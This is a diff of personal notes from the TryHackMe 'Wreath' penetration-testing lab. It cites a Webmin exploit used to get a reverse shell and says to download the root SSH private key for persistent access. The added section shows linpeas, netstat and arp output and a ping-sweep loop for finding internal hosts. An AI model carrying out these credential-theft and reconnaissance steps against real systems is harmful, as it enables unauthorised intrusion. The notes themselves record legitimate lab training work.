@@ -36,8 +36,9 @@ Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds
 <b>Service Webmin is vulnarable</b>
 link: https://github.com/MuirlandOracle/CVE-2019-15107
 
-use exploid to get reverse shell
-download /root/.ssh/id_rsa to get pernament access via ssh
+use exploit to get reverse shell
+
+<b>download /root/.ssh/id_rsa to get pernament access via ssh</b>
 
 ┌──(duke㉿kali) [/Documents/THM_Wreath]
 └─$ cp id_rsa root                        
@@ -48,6 +49,36 @@ download /root/.ssh/id_rsa to get pernament access via ssh
 [root@prod-serv ~]# id
 uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 [root@prod-serv ~]# 
+
+<h2>Enumaration/Pivoting </h2>
+run linpeas
+╔══════════╣ Mails (limit 50)
+ 13718632      0 -rw-rw----   1  twreath  mail            0 Nov  7  2020 /var/mail/twreath                          
+ 12674676      0 -rw-rw----   1  dheenaxe mail            0 Jan 25 07:58 /var/mail/dheenaxe
+ 13718632      0 -rw-rw----   1  twreath  mail            0 Nov  7  2020 /var/spool/mail/twreath
+ 12674676      0 -rw-rw----   1  dheenaxe mail            0 Jan 25 07:58 /var/spool/mail/dheenaxe
+
+ [root@prod-serv ~]# netstat -a
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:hostmon         0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:ndmp            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+tcp        0     36 ip-10-200-85-200.eu:ssh ip-10-50-86-201.e:52266 ESTABLISHED
+tcp        1      0 ip-10-200-85-200.e:ndmp ip-10-50-86-177.e:50390 CLOSE_WAIT 
+tcp        0      0 ip-10-200-85-200.:52180 ip-10-50-8:search-agent ESTABLISHED
+tcp        0      0 ip-10-200-85-200.:56776 ip-10-50-86-177.e:https ESTABLISHED
+tcp        1      0 ip-10-200-85-200.e:ndmp ip-10-50-86-231.e:58264 CLOSE_WAIT 
+
+[root@prod-serv ~]# arp -a
+ip-10-200-85-150.eu-west-1.compute.internal (10.200.85.150) at 02:1a:65:6e:5d:1f [ether] on eth0
+ip-10-200-85-100.eu-west-1.compute.internal (10.200.85.100) at 02:35:7b:8f:3a:af [ether] on eth0
+ip-10-200-85-1.eu-west-1.compute.internal (10.200.85.1) at 02:16:e7:43:1c:11 [ether] on eth0
+
+[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done
+64 bytes from 10.200.85.1: icmp_seq=1 ttl=255 time=0.293 ms
+64 bytes from 10.200.85.200: icmp_seq=1 ttl=64 time=0.051 ms
+64 bytes from 10.200.85.250: icmp_seq=1 ttl=64 time=0.574 ms
 
 
 </code>
